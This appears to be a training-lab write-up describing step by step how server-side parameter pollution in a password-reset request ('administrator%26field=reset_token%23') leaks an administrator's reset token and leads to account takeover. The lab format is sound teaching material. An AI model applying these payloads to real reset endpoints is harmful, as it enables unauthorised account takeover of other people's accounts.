
# Exploiting a Password Reset Vulnerability

## Overview

In this lab, I exploited a password reset vulnerability in the application by manipulating parameters to reveal a password reset token for the administrator account. This allowed me to reset the administrator’s password and delete a user from the admin panel.

## Steps

### 1. Triggering the Password Reset Request

In Burp's browser, I triggered a password reset for the **administrator** user, capturing the request in **Proxy > HTTP history**. The captured request looked like this:

```http
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

username=administrator
```

I then right-clicked the request and sent it to **Repeater** to observe the response and confirm consistent behavior.

### 2. Testing with Invalid Username

I changed the value of the `username` parameter to an invalid one, such as `administratorx`, and sent the request:

```json
{
  "username": "administratorx"
}
```

This resulted in a **400 Bad Request** response with an error message:

```json
{
  "error": "Invalid username"
}
```

### 3. Attempting Parameter Injection

Next, I attempted to inject a new parameter by appending an additional URL-encoded parameter (`&x=y`) using the following payload:

```http
username=administrator%26x=y
```

This returned a **Parameter not supported** error:

```json
{
  "error": "Parameter is not supported"
}
```

This indicated that the server may have interpreted the `&x=y` as a separate parameter.

### 4. Truncating the Query String with `#`

I attempted to truncate the query string by appending a URL-encoded `#` character:

```http
username=administrator%23
```

This resulted in a **Field not specified** error:

```json
{
  "error": "Field not specified"
}
```

This suggested the presence of a `field` parameter in the server-side query that was likely being removed due to the `#`.

### 5. Adding a New Field Parameter

I then attempted to inject a new `field` parameter and truncate the query string using the following payload:

```http
username=administrator%26field=x%23
```

This returned an **Invalid field** error:

```json
{
  "error": "Invalid field"
}
```

This indicated that the application recognized the injected `field` parameter.

### 6. Brute-Forcing the Field Parameter

I brute-forced the value of the `field` parameter using Burp Intruder. The payloads I used for brute-forcing included common server-side variable names like `username`, `email`, etc. The payload string was as follows:

```http
username=administrator%26field=§x§%23
```

After reviewing the results, I noticed that the requests with the `email` payload returned a **200 OK** response.

### 7. Changing the Field Parameter to `email`

I modified the request to use `email` as the `field` parameter:

```http
username=administrator%26field=email%23
```

This returned the original response, indicating that `email` was a valid field type.

### 8. Extracting the Password Reset Token

Upon reviewing the **/static/js/forgotPassword.js** file in **Proxy > HTTP history**, I found the password reset endpoint and the parameter `reset_token`.

I modified the payload again to inject the `reset_token` field:

```http
username=administrator%26field=reset_token%23
```

This returned the password reset token for the administrator:

```json
{
  "reset_token": "123456789"
}
```

### 9. Resetting the Administrator's Password

I entered the password reset endpoint in the browser, appending the `reset_token`:

```http
/forgot-password?reset_token=123456789
```

I then set a new password for the administrator.

### 10. Logging In and Deleting the User

Finally, I logged in as the administrator using the new password, navigated to the admin panel, and deleted **carlos** to solve the lab.
